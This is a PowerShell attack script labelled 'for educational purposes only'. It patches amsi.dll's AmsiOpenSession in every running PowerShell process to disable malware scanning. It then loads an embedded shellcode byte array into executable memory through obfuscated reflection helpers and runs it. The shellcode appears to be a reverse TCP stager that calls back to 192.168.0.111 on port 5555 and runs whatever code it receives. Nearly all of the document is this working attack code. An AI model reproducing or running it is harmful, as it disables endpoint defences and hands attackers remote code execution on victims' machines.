# ASCII Art Banner
$banner = @'

             _         ___ ___  ________ _____ 
            | |       / _ \|  \/  /  ___|_   _|
 _ __  _   _| | _____/ /_\ \ .  . \ `--.  | |  
| '_ \| | | | |/ / _ \  _  | |\/| |`--. \ | |  
| | | | |_| |   <  __/ | | | |  | /\__/ /_| |_ 
|_| |_|\__,_|_|\_\___\_| |_|_|  |_|____/ \___/ 
                                               
                                               
                                             
---------------------------------------------------------------
 Developed by Abhishek Sharma | Date: 10/08/24
 Created for educational purposes only
---------------------------------------------------------------
'@

Write-Host $banner -ForegroundColor Green


# Prompt the user for confirmation


Add-Type -TypeDefinition @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

public class NukeAMSI
{
    public const int PROCESS_VM_OPERATION = 0x0008;
    public const int PROCESS_VM_READ = 0x0010;
    public const int PROCESS_VM_WRITE = 0x0020;
    public const uint PAGE_EXECUTE_READWRITE = 0x40;

    // NtOpenProcess: Opens a handle to a process.
    [DllImport("ntdll.dll")]
    public static extern int NtOpenProcess(out IntPtr ProcessHandle, uint DesiredAccess, [In] ref OBJECT_ATTRIBUTES ObjectAttributes, [In] ref CLIENT_ID ClientId);

    // NtWriteVirtualMemory: Writes to the memory of a process.
    [DllImport("ntdll.dll")]
    public static extern int NtWriteVirtualMemory(IntPtr ProcessHandle, IntPtr BaseAddress, byte[] Buffer, uint NumberOfBytesToWrite, out uint NumberOfBytesWritten);

    // NtClose: Closes an open handle.
    [DllImport("ntdll.dll")]
    public static extern int NtClose(IntPtr Handle);

    // LoadLibrary: Loads the specified module into the address space of the calling process.
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr LoadLibrary(string lpFileName);

    // GetProcAddress: Retrieves the address of an exported function or variable from the specified dynamic-link library (DLL).
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    // VirtualProtectEx: Changes the protection on a region of memory within the virtual address space of a specified process.
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

    [StructLayout(LayoutKind.Sequential)]
    public struct OBJECT_ATTRIBUTES
    {
        public int Length;
        public IntPtr RootDirectory;
        public IntPtr ObjectName;
        public int Attributes;
        public IntPtr SecurityDescriptor;
        public IntPtr SecurityQualityOfService;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct CLIENT_ID
    {
        public IntPtr UniqueProcess;
        public IntPtr UniqueThread;
    }
}
"@

function ModAMSI {
    param (
        [int]$processId
    )

    Write-Host "Modifying AMSI for process ID: $processId" -ForegroundColor Cyan

    $patch = [byte]0xEB  # The patch byte to modify AMSI behavior

    $objectAttributes = New-Object NukeAMSI+OBJECT_ATTRIBUTES
    $clientId = New-Object NukeAMSI+CLIENT_ID
    $clientId.UniqueProcess = [IntPtr]$processId
    $clientId.UniqueThread = [IntPtr]::Zero
    $objectAttributes.Length = [System.Runtime.InteropServices.Marshal]::SizeOf($objectAttributes)

    $hHandle = [IntPtr]::Zero
    $status = [NukeAMSI]::NtOpenProcess([ref]$hHandle, [NukeAMSI]::PROCESS_VM_OPERATION -bor [NukeAMSI]::PROCESS_VM_READ -bor [NukeAMSI]::PROCESS_VM_WRITE, [ref]$objectAttributes, [ref]$clientId)

    if ($status -ne 0) {
        Write-Host "Failed to open process. NtOpenProcess status: $status" -ForegroundColor Red
        return
    }

    Write-Host "Loading amsi.dll..." -ForegroundColor Cyan
    $amsiHandle = [NukeAMSI]::LoadLibrary("amsi.dll")
    if ($amsiHandle -eq [IntPtr]::Zero) {
        Write-Host "Failed to load amsi.dll." -ForegroundColor Red
        [NukeAMSI]::NtClose($hHandle)
        return
    }

    Write-Host "Getting address of AmsiOpenSession function..." -ForegroundColor Cyan
    $amsiOpenSession = [NukeAMSI]::GetProcAddress($amsiHandle, "AmsiOpenSession")
    if ($amsiOpenSession -eq [IntPtr]::Zero) {
        Write-Host "Failed to find AmsiOpenSession function in amsi.dll." -ForegroundColor Red
        [NukeAMSI]::NtClose($hHandle)
        return
    }

    # Calculate the correct patch address by offsetting from AmsiOpenSession function
    $patchAddr = [IntPtr]($amsiOpenSession.ToInt64() + 3)

    Write-Host "Changing memory protection at address $patchAddr to PAGE_EXECUTE_READWRITE..." -ForegroundColor Cyan
    $oldProtect = [UInt32]0
    $size = [UIntPtr]::new(1)  # Correct conversion to UIntPtr
    $protectStatus = [NukeAMSI]::VirtualProtectEx($hHandle, $patchAddr, $size, [NukeAMSI]::PAGE_EXECUTE_READWRITE, [ref]$oldProtect)

    if (-not $protectStatus) {
        Write-Host "Failed to change memory protection." -ForegroundColor Red
        [NukeAMSI]::NtClose($hHandle)
        return
    }

    Write-Host "Patching memory at address $patchAddr with byte 0xEB..." -ForegroundColor Cyan
    $bytesWritten = [System.UInt32]0
    $status = [NukeAMSI]::NtWriteVirtualMemory($hHandle, $patchAddr, [byte[]]@($patch), 1, [ref]$bytesWritten)

    if ($status -eq 0) {
        Write-Host "Memory patched successfully at address $patchAddr." -ForegroundColor Green
    } else {
        Write-Host "Failed to patch memory. NtWriteVirtualMemory status: $status" -ForegroundColor Red
    }

    Write-Host "Restoring original memory protection..." -ForegroundColor Cyan
    $restoreStatus = [NukeAMSI]::VirtualProtectEx($hHandle, $patchAddr, $size, $oldProtect, [ref]$oldProtect)

    if (-not $restoreStatus) {
        Write-Host "Failed to restore memory protection." -ForegroundColor Red
    }

    Write-Host "Closing handle to process with ID $processId." -ForegroundColor Cyan
    [NukeAMSI]::NtClose($hHandle)
}

function ModAllPShells {
    Write-Host "Modifying all PowerShell processes..." -ForegroundColor Cyan
    Get-Process | Where-Object { $_.ProcessName -eq "powershell" } | ForEach-Object {
        Write-Host "Modifying process with ID $_.Id" -ForegroundColor Cyan
        ModAMSI -processId $_.Id
    }
}

Write-Host "Starting AMSI modification script..." -ForegroundColor Cyan
ModAllPShells
Write-Host "AMSI modification script completed." -ForegroundColor Green
function potatoes {
Param ($cherries, $pineapple)
$tomatoes = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
$turnips=@()
$tomatoes.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$turnips+=$_}}
return $turnips[0].Invoke($null, @(($tomatoes.GetMethod('GetModuleHandle')).Invoke($null, @($cherries)), $pineapple))
}
function apples {
Param (
[Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
[Parameter(Position = 1)] [Type] $delType = [Void]
)
$type = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass',[System.MulticastDelegate])
$type.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).SetImplementationFlags('Runtime, Managed')
$type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).SetImplementationFlags('Runtime, Managed')
return $type.CreateType()
}
$cucumbers = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((potatoes kernel32.dll VirtualAlloc), (apples @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, 0x1000, 0x3000, 0x40)
[Byte[]] $buf = {0xfc,0x48,0x83,0xe4,0xf0,0xe8,
0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,
0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
0x8b,0x52,0x20,0x48,0x0f,0xb7,0x4a,0x4a,0x48,0x8b,0x72,0x50,
0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,
0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,
0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x66,
0x81,0x78,0x18,0x0b,0x02,0x0f,0x85,0x72,0x00,0x00,0x00,0x8b,
0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,
0xd0,0x50,0x44,0x8b,0x40,0x20,0x8b,0x48,0x18,0x49,0x01,0xd0,
0xe3,0x56,0x48,0xff,0xc9,0x4d,0x31,0xc9,0x41,0x8b,0x34,0x88,
0x48,0x01,0xd6,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,
0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,
0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,
0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,
0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,
0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,
0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,
0x4b,0xff,0xff,0xff,0x5d,0x49,0xbe,0x77,0x73,0x32,0x5f,0x33,
0x32,0x00,0x00,0x41,0x56,0x49,0x89,0xe6,0x48,0x81,0xec,0xa0,
0x01,0x00,0x00,0x49,0x89,0xe5,0x49,0xbc,0x02,0x00,0x15,0xb3,
0xc0,0xa8,0x00,0x6f,0x41,0x54,0x49,0x89,0xe4,0x4c,0x89,0xf1,
0x41,0xba,0x4c,0x77,0x26,0x07,0xff,0xd5,0x4c,0x89,0xea,0x68,
0x01,0x01,0x00,0x00,0x59,0x41,0xba,0x29,0x80,0x6b,0x00,0xff,
0xd5,0x6a,0x0a,0x41,0x5e,0x50,0x50,0x4d,0x31,0xc9,0x4d,0x31,
0xc0,0x48,0xff,0xc0,0x48,0x89,0xc2,0x48,0xff,0xc0,0x48,0x89,
0xc1,0x41,0xba,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x48,0x89,0xc7,
0x6a,0x10,0x41,0x58,0x4c,0x89,0xe2,0x48,0x89,0xf9,0x41,0xba,
0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0x49,0xff,
0xce,0x75,0xe5,0xe8,0x93,0x00,0x00,0x00,0x48,0x83,0xec,0x10,
0x48,0x89,0xe2,0x4d,0x31,0xc9,0x6a,0x04,0x41,0x58,0x48,0x89,
0xf9,0x41,0xba,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,
0x7e,0x55,0x48,0x83,0xc4,0x20,0x5e,0x89,0xf6,0x6a,0x40,0x41,
0x59,0x68,0x00,0x10,0x00,0x00,0x41,0x58,0x48,0x89,0xf2,0x48,
0x31,0xc9,0x41,0xba,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x48,0x89,
0xc3,0x49,0x89,0xc7,0x4d,0x31,0xc9,0x49,0x89,0xf0,0x48,0x89,
0xda,0x48,0x89,0xf9,0x41,0xba,0x02,0xd9,0xc8,0x5f,0xff,0xd5,
0x83,0xf8,0x00,0x7d,0x28,0x58,0x41,0x57,0x59,0x68,0x00,0x40,
0x00,0x00,0x41,0x58,0x6a,0x00,0x5a,0x41,0xba,0x0b,0x2f,0x0f,
0x30,0xff,0xd5,0x57,0x59,0x41,0xba,0x75,0x6e,0x4d,0x61,0xff,
0xd5,0x49,0xff,0xce,0xe9,0x3c,0xff,0xff,0xff,0x48,0x01,0xc3,
0x48,0x29,0xc6,0x48,0x85,0xf6,0x75,0xb4,0x41,0xff,0xe7,0x58,
0x6a,0x00,0x59,0x49,0xc7,0xc2,0xf0,0xb5,0xa2,0x56,0xff,0xd5
};
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $cucumbers, $buf.length)
$parsnips =
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((potatoes kernel32.dll CreateThread), (apples @([IntPtr], [UInt32], [IntPtr], [IntPtr],[UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$cucumbers,[IntPtr]::Zero,0,[IntPtr]::Zero)
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((potatoes kernel32.dll WaitForSingleObject), (apples @([IntPtr], [Int32]) ([Int]))).Invoke($parsnips, 0xFFFFFFFF)
